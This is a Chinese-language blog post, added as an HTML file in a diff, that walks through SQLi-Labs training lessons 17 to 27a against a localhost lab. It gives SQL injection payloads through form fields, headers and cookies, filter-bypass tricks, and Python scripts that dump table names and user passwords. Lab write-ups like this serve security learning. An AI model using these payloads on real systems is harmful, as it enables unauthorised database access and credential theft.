@@ -1,0 +1,357 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+
+
+
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="UTF-8">
+    <link rel="apple-touch-icon" sizes="76x76" href="/img/apple-touch-icon.png">
+    <link rel="icon" type="image/png" href="/img/favicon.png">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+    <meta http-equiv="x-ua-compatible" content="ie=edge">
+    <meta name="description" content>
+    <meta name="author" content="John Doe">
+    <meta name="keywords" content>
+    <title>Sqli_Lab_Learning ~ W366er</title>
+    <link rel="stylesheet" href="/lib/font-awesome/css/all.min.css?v=5.7.2">
+    <link rel="stylesheet" href="/lib/mdbootstrap/css/bootstrap.min.css?v=4.3.1">
+    <link rel="stylesheet" href="/lib/mdbootstrap/css/mdb.min.css?v=4.8.7">
+    <link rel="stylesheet" href="/lib/github-markdown/github-markdown.min.css">
+    <link rel="stylesheet" href="/lib/nprogress/nprogress.css?v=0.2.0">
+    <link rel="stylesheet" href="//at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">
+    
+        <link rel="stylesheet" href="/lib/prettify/tomorrow-night-eighties.min.css">
+    
+    <link rel="stylesheet" href="/css/main.css">
+
+    
+</head>
+
+
+<body>
+<header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+<div class="container">
+    <a class="navbar-brand" href="/">&nbsp;<strong>W366er</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent"
+        aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+        <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+        <ul class="navbar-nav ml-auto text-center">
+            
+            <li class="nav-item">
+                <a class="nav-link" href="/">Home</a>
+            </li>
+            
+            <li class="nav-item">
+                <a class="nav-link" href="/archives/">Archives</a>
+            </li>
+            
+            <li class="nav-item">
+                <a class="nav-link" href="/categories/">Categories</a>
+            </li>
+            
+            <li class="nav-item">
+                <a class="nav-link" href="/tags/">Tags</a>
+            </li>
+            
+            <li class="nav-item">
+                <a class="nav-link" href="/about/">About</a>
+            </li>
+            
+        </ul>
+    </div>
+</div>
+
+
+</nav>
+    <div class="view intro-2"
+         style="background: url('/img/post.jpg')no-repeat center center;background-size: cover;">
+        <div class="full-bg-img">
+            <div class="mask rgba-black-light flex-center">
+                <div class="container text-center white-text wow fadeInUp">
+                    <span class="h2" id="subtitle">
+                        
+                    </span>
+                    
+                        <br>
+                        <p>Monday, November 4th 2019, 7:56 am</p>
+                    
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+<main>
+    
+        
+
+<div class="container-fluid">
+    <div class="row">
+        <div class="d-none d-lg-block col-lg-2"></div>
+            <div class="col-lg-8 nopadding-md">
+                <div class="py-5 z-depth-3 board">
+                    <div class="post-content mx-auto">
+                        <div class="markdown-body">
+                            <h1 id="Easy-Challenges"><a href="#Easy-Challenges" class="headerlink" title="Easy Challenges"></a>Easy Challenges</h1><h2 id="Lesson-17"><a href="#Lesson-17" class="headerlink" title="Lesson 17"></a>Lesson 17</h2><p>首先有一个 PHP 的 check_input 的过滤机制：</p>
+<pre><code>function check_input($value)
+    {
+    if(!empty($value))
+        {
+        // truncation (see comments)
+        $value = substr($value,0,15);
+        }
+
+        // Stripslashes if magic quotes enabled
+        if (get_magic_quotes_gpc()) // 默认为 false
+            {
+            $value = stripslashes($value);  // 删除反斜杠
+            }
+
+        // Quote if not a number
+        if (!ctype_digit($value))
+            {
+            $value = &quot;&#39;&quot; . mysql_real_escape_string($value) . &quot;&#39;&quot;;
+            }
+
+    else
+        {
+        $value = intval($value);
+        }
+    return $value;
+    }
+</code></pre><ul>
+<li>“ $value = substr($value,0,15); ”该函数只截取前 15 个字符。</li>
+<li>get_magic_quotes_gpc()函数，获取当前magic_quotes_gpc的配置选项设置。查一下手册：</li>
+</ul>
+<p><img src="/images/Sqli_Lab_Learning/get_magic_quotes_gpc.png" alt></p>
+<p>题目这里的意思是如果原来设置了 get_magic_quotes_gpc()，则将该设置所添加的反斜杠去掉。</p>
+<ul>
+<li>ctype_digit() 函数，做纯数字检测。查一下手册：<br><img src="/images/Sqli_Lab_Learning/ctype_digit.png" alt></li>
+<li>mysql_real_escape_string()函数，该函数是安全函数。<br><img src="/images/Sqli_Lab_Learning/mysql_real_escape_string.png" alt></li>
+</ul>
+<p>因此，这题 uname 无法利用（存在安全函数）。 所以，对 passwd 进行报错注入，并且uname 的值必须为 user  表中 username 字段中的某一个值。<br>exp 如下：</p>
+<pre><code># -*- coding: utf-8 -*-
+import requests
+
+main_url = &quot;http://localhost:81/SQLI-LABS/sqli-labs-master/Less-17/index.php&quot;
+
+payload = [&quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;,  # 爆表
+           &quot;select group_concat(column_name) from information_schema.columns where table_name=\&#39;users\&#39;&quot;,  # 爆字段
+           ]
+for i_payload in payload:
+    main_payload = {&quot;uname&quot;:&quot;admin&quot;, &quot;passwd&quot;:&quot;admin\&#39; and updatexml(1,concat(0x7e,(&quot; + i_payload + &quot;),0x7e),1)#&quot;}
+    response = requests.post(url=main_url, data=main_payload)
+    print response.content
+</code></pre><h2 id="Lesson-18-Useragent-注入"><a href="#Lesson-18-Useragent-注入" class="headerlink" title="Lesson 18 Useragent 注入"></a>Lesson 18 Useragent 注入</h2><p>uname 和 passwd 无法注入。发现 user agent 注入点，进行报错注入，uname 和 passwd 要确保能够有查询结果，payload:</p>
+<pre><code>&#39; and updatexml(1,concat(0x7e,database(),0x7e),1) and &#39;1&#39;=&#39;1</code></pre><p>如图所示：<br><img src="/images/Sqli_Lab_Learning/user_agent_sql.png" alt></p>
+<h2 id="Lesson-19-Referer-注入"><a href="#Lesson-19-Referer-注入" class="headerlink" title="Lesson 19 Referer 注入"></a>Lesson 19 Referer 注入</h2><p>同样地，uname 和 passwd 无法注入。存在 Referer 注入点，进行报错注入，uname 和 passwd 要确保有查询结果，payload:</p>
+<pre><code>&#39; and updatexml(1,concat(0x7e, (select database()),0x7e),1) and &#39;1&#39; = &#39;1</code></pre><p>如图所示：<br><img src="/images/Sqli_Lab_Learning/user_agent_sql.png" alt></p>
+<h2 id="Lesson-20-Cookie-注入"><a href="#Lesson-20-Cookie-注入" class="headerlink" title="Lesson 20 Cookie 注入"></a>Lesson 20 Cookie 注入</h2><p>uname 和 passwd 无法注入。存在 Cookie 注入点，进行报错注入，payload:</p>
+<pre><code>uname=admin&#39; and updatexml(1,concat(0x7e,(select database()),0x7e),1)#</code></pre><p>如图所示：<br><img src="/images/Sqli_Lab_Learning/Cookie_sql.png" alt></p>
+<h2 id="Lesson-21"><a href="#Lesson-21" class="headerlink" title="Lesson 21"></a>Lesson 21</h2><p>Cookie 注入，万变不离其宗，报错注入加上 base64，’)闭合，payload 如下：</p>
+<pre><code>uname=JykgYW5kIHVwZGF0ZXhtbCgxLGNvbmNhdCgweDdlLChzZWxlY3QgZGF0YWJhc2UoKSksMHg3ZSksMSkgYW5kICgnMScpPSgnMQ==</code></pre><p>如图所示：<br><img src="/images/Sqli_Lab_Learning/Lesson_21_1.png" alt></p>
+<h2 id="Lesson-22"><a href="#Lesson-22" class="headerlink" title="Lesson 22"></a>Lesson 22</h2><p>Cookie 注入，报错注入加上 base64，双引号闭合，payload 如下：</p>
+<pre><code>uname=IiBhbmQgdXBkYXRleG1sKDEsY29uY2F0KDB4N2UsKHNlbGVjdCBkYXRhYmFzZSgpKSwweDdlKSwxKSBhbmQgIjEiID0iMQ==</code></pre><p>如图所示：<br><img src="/images/Sqli_Lab_Learning/Lesson_22_1.png" alt></p>
+<h2 id="Lesson-23"><a href="#Lesson-23" class="headerlink" title="Lesson 23"></a>Lesson 23</h2><p>普通联合注入，单引号闭合，payload 如下：</p>
+<pre><code>?id=-1&#39; union select 2,(select table_name from information_schema.tables where table_schema=database() limit 0,1),1 or &#39;1&#39; =&#39;1</code></pre><p>exp:</p>
+<pre><code># -*- coding: utf-8 -*-
+import requests
+
+main_url = &quot;http://localhost:81/SQLI-LABS/sqli-labs-master/Less-23/index.php&quot;
+for i in range(10):
+    payload = &quot;?id=-1&#39; union select 1,(select table_name from information_schema.tables where table_schema=database(&quot; \
+              &quot;)limit + &quot; + str(i) + &quot;,1),2 or &#39;1&#39; =&#39;1 &quot;
+    url = main_url + payload
+    response = requests.get(url)
+    result = response.text
+    result = result[570:]
+    result = result[:result.find(&quot;&lt;&quot;)]
+    print result
+    if result == &quot;&quot;:
+        break
+
+
+for i in range(10):
+    payload2 = &quot;?id=-1&#39; union select 1,(select group_concat(username, &#39; _ &#39;, password) from users limit + &quot; + str(
+        i) + &quot;,1),2 or &#39;1&#39; =&#39;1&quot;
+    url = main_url + payload2
+    response = requests.get(url)
+    result = response.text
+    result = result[570:]
+    result = result[:result.find(&quot;&lt;&quot;)]
+    print result
+    if result == &quot;&quot;:
+        break
+</code></pre><h2 id="Lesson-24"><a href="#Lesson-24" class="headerlink" title="Lesson 24"></a>Lesson 24</h2><p>这题本身就有问题，猜测出题人漏了从 Logged-in.php 到 pass_change.php 的跳转。先抛开这个 bug。<br>这题为二次注入，首先理解什么是二次注入：</p>
+<pre><code>原理：
+攻击者构造的恶意数据存储在数据库后，恶意数据被读取并进入到SQL查询语句所导致的注入。防御者可能在用户输入恶意数据时对其中的特殊字符进行了转义处理，但在恶意数据插入到数据库时被处理的数据又被还原并存储在数据库中，当Web程序调用存储在数据库中的恶意数据并执行SQL查询时，就发生了SQL二次注入。
+
+
+步骤：
+第一步：插入恶意数据
+进行数据库插入数据时，对其中的特殊字符进行了转义处理，在写入数据库的时候又保留了原来的数据。
+
+第二步：引用恶意数据
+开发者默认存入数据库的数据都是安全的，在进行查询时，直接从数据库中取出恶意数据，没有进行进一步的检验的处理。</code></pre><ul>
+<li>mysql_escape_string() 函数将单引号（’）转义。 </li>
+<li>insert 语句中插入值含有 ‘#’ 不会起作用。</li>
+<li>单转义斜杆在字符串中不会存入到数据库中。<br>由于上面两点，php 可以    将恶意数据当成安全数据存到数据库中。</li>
+</ul>
+<p>同时还要注意，第二次注入成功，还需要第二次和第一次相应的数据项匹配（像这里 admin 和 admin’#）。</p>
+<h2 id="Lesson-25"><a href="#Lesson-25" class="headerlink" title="Lesson 25"></a>Lesson 25</h2><p>双写绕过注入，单引号闭合。<br>payload:</p>
+<pre><code>?id=-1&#39; union select 1,2,group_concat(table_name) from infoorrmation_schema.tables where table_schema=database()%23</code></pre><h2 id="Lesson-25a"><a href="#Lesson-25a" class="headerlink" title="Lesson 25a"></a>Lesson 25a</h2><p>双写绕过注入，无闭合。<br>payload:</p>
+<pre><code>?id=-1 union select 1,3,group_concat(table_name) from infoorrmation_schema.tables where table_schema=database() %23</code></pre><h2 id="Lesson-26"><a href="#Lesson-26" class="headerlink" title="Lesson 26"></a>Lesson 26</h2><p>带 FUZZ，过滤 or，and，*，/，–，#，空格，\。<br>使用 %a0 绕过空格过滤，报错注入，单引号闭合。<br>payload:</p>
+<pre><code>?id=-1&#39;||updatexml(1,concat(0x7e,(select%a0group_concat(table_name)%a0from%a0infoorrmation_schema.tables%a0where%a0table_schema=database()), 0x7e),1)||&#39;1&#39;=&#39;1</code></pre><p>值得注意的是，这里 -1 和 子句之间的连接使用了 || 。（没搞懂为什么不可以用&amp;&amp;）</p>
+<h2 id="Lesson-26a"><a href="#Lesson-26a" class="headerlink" title="Lesson 26a"></a>Lesson 26a</h2><p>FUZZ 和上题相同，但是’)闭合。<br>搞了半天报错注入，才发现没有 print_r(mysql_error()); 报错点，于是改用正常的联合注入。<br>payload:</p>
+<pre><code>?id=&#39;)%a0union%a0select%a01,2,group_concat(table_name)%a0from%a0infoorrmation_schema.tables%a0where%a0table_schema=database()||(&#39;</code></pre><p>这里在 id 选择不赋值，因为如果赋负值，后台会将负值 “-“ 过滤掉，变成正值无法获得想要的回显。</p>
+<h2 id="Lesson-27"><a href="#Lesson-27" class="headerlink" title="Lesson 27"></a>Lesson 27</h2><p>FUZZ 过滤了/，*，-，#，+，select，union。</p>
+<p>源码：</p>
+<pre><code>function blacklist($id)
+{
+$id= preg_replace(&#39;/[\/\*]/&#39;,&quot;&quot;, $id);        //strip out /*
+$id= preg_replace(&#39;/[--]/&#39;,&quot;&quot;, $id);        //Strip out --.
+$id= preg_replace(&#39;/[#]/&#39;,&quot;&quot;, $id);            //Strip out #.
+$id= preg_replace(&#39;/[ +]/&#39;,&quot;&quot;, $id);        //Strip out spaces.
+$id= preg_replace(&#39;/select/m&#39;,&quot;&quot;, $id);        //Strip out spaces.
+$id= preg_replace(&#39;/[ +]/&#39;,&quot;&quot;, $id);        //Strip out spaces.
+$id= preg_replace(&#39;/union/s&#39;,&quot;&quot;, $id);        //Strip out union
+$id= preg_replace(&#39;/select/s&#39;,&quot;&quot;, $id);        //Strip out select
+$id= preg_replace(&#39;/UNION/s&#39;,&quot;&quot;, $id);        //Strip out UNION
+$id= preg_replace(&#39;/SELECT/s&#39;,&quot;&quot;, $id);        //Strip out SELECT
+$id= preg_replace(&#39;/Union/s&#39;,&quot;&quot;, $id);        //Strip out Union
+$id= preg_replace(&#39;/Select/s&#39;,&quot;&quot;, $id);        //Strip out select
+return $id;
+}
+</code></pre><ul>
+<li>空格过滤使用 %a0 绕过。</li>
+<li>三次写 select 对两次 select 过滤进行绕过。</li>
+</ul>
+<p>payload:</p>
+<pre><code>?id=-1&#39;||updatexml(1,concat(0x7e,(selseselectlectect%a0group_concat(table_name)%a0from%a0information_schema.tables%a0where%a0table_schema=database()),0x7e),1)||&#39;</code></pre><h2 id="Lesson-27a"><a href="#Lesson-27a" class="headerlink" title="Lesson 27a"></a>Lesson 27a</h2><p>FUZZ：</p>
+<pre><code>function blacklist($id)
+{
+$id= preg_replace(&#39;/[\/\*]/&#39;,&quot;&quot;, $id);        //strip out /*
+$id= preg_replace(&#39;/[--]/&#39;,&quot;&quot;, $id);        //Strip out --.
+$id= preg_replace(&#39;/[#]/&#39;,&quot;&quot;, $id);            //Strip out #.
+$id= preg_replace(&#39;/[ +]/&#39;,&quot;&quot;, $id);        //Strip out spaces.
+$id= preg_replace(&#39;/select/m&#39;,&quot;&quot;, $id);        //Strip out spaces.
+$id= preg_replace(&#39;/[ +]/&#39;,&quot;&quot;, $id);        //Strip out spaces.
+$id= preg_replace(&#39;/union/s&#39;,&quot;&quot;, $id);        //Strip out union
+$id= preg_replace(&#39;/select/s&#39;,&quot;&quot;, $id);        //Strip out select
+$id= preg_replace(&#39;/UNION/s&#39;,&quot;&quot;, $id);        //Strip out UNION
+$id= preg_replace(&#39;/SELECT/s&#39;,&quot;&quot;, $id);        //Strip out SELECT
+$id= preg_replace(&#39;/Union/s&#39;,&quot;&quot;, $id);        //Strip out Union
+$id= preg_replace(&#39;/Select/s&#39;,&quot;&quot;, $id);        //Strip out Select
+return $id;
+}
+</code></pre><p>“ 闭合，无 print_r(mysql_error()); 所以使用普通的联合注入。<br>payload:</p>
+<pre><code>?id=&quot;unIon%a0sELEct%a01,(sELEct%a0group_concat(table_name)%a0from%a0information_schema.tables%a0where%a0table_schema=database()),3||&quot;</code></pre><p>这里可以使用之前的三次写 select，两次写 union 的方法，也可以大小写绕过。</p>
+<h2 id="Lesson-28"><a href="#Lesson-28" class="headerlink" title="Lesson 28"></a>Lesson 28</h2>
+                            <hr>
+                        </div>
+                        <br>
+                        <div>
+                            
+                            <p>
+                                <i class="iconfont icon-tag"></i>
+                                
+                            </p>
+                            
+                                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" rel="nofollow noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
+                            
+                        </div>
+                    </div>
+                </div>
+            </div>
+        <div class="d-none d-lg-block col-lg-2 toc-container">
+            
+  <div id="toc">
+    <p class="h4"><i class="far fa-list-alt"></i> Toc:</p> 
+    <div id="tocbot"></div>
+  </div>
+
+        </div>
+    </div>
+</div>
+
+<!-- custom -->
+
+
+<!-- Comments -->
+<div class="col-lg-7 mx-auto nopadding-md">
+    <div class="container comments mx-auto" id="comments">
+        
+    </div>
+</div>
+    
+</main>
+
+<footer class="mt-5">
+  <div class="text-center py-3">
+    <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><b>Hexo</b></a>
+    <i class="iconfont icon-love"></i>
+    <a href="https://github.com/0x2e/Material-T" target="_blank" rel="nofollow noopener"> <b>Material-T</b></a>
+    <br>
+    
+  </div>
+</footer>
+
+  <!-- SCRIPTS -->
+  <script src="/lib/mdbootstrap/js/jquery-3.4.1.min.js"></script>
+  <script src="/lib/mdbootstrap/js/popper.min.js"></script>
+  <script src="/lib/mdbootstrap/js/bootstrap.min.js?v=4.3.1"></script>
+  <script src="/lib/mdbootstrap/js/mdb.min.js?v=4.8.7"></script>
+  <script src="/lib/nprogress/nprogress.min.js?v=0.2.0"></script>
+  <script src="/js/main.js"></script>
+  
+    
+      <script src="/lib/tocbot/tocbot.min.js?v=4.7.0"></script>
+    
+    <script src="/js/post.js"></script>
+  
+  
+    <script src="/lib/prettify/prettify.min.js?v=0.1.0"></script>
+    <script>
+      $(document).ready(function(){
+        $('pre').addClass('prettyprint linenums');
+        prettyPrint();
+      })
+    </script>
+  
+  
+    <script src="/lib/typed/typed.min.js?v=2.0.9"></script>
+    <script>
+        var typed = new Typed('#subtitle', {
+          strings: [
+            '  ',
+            "Sqli_Lab_Learning&nbsp;",
+        ],
+        cursorChar: "_",
+        typeSpeed: 70,
+        startDelay: 300, //开始之前延迟300毫秒
+        loop: false,
+        });
+        $(".typed-cursor").addClass("h2");
+    </script>
+  
+  
+    <script src="/lib/anchor/anchor.min.js?v=4.2.0"></script>
+    <script>
+      anchors.options = {
+        placement: "right",
+        visible: "false",
+        
+      };
+      anchors.add(".post-content > h1,h2,h3,h4,h5,h6");
+    </script>
+  
+</body>
+</html>
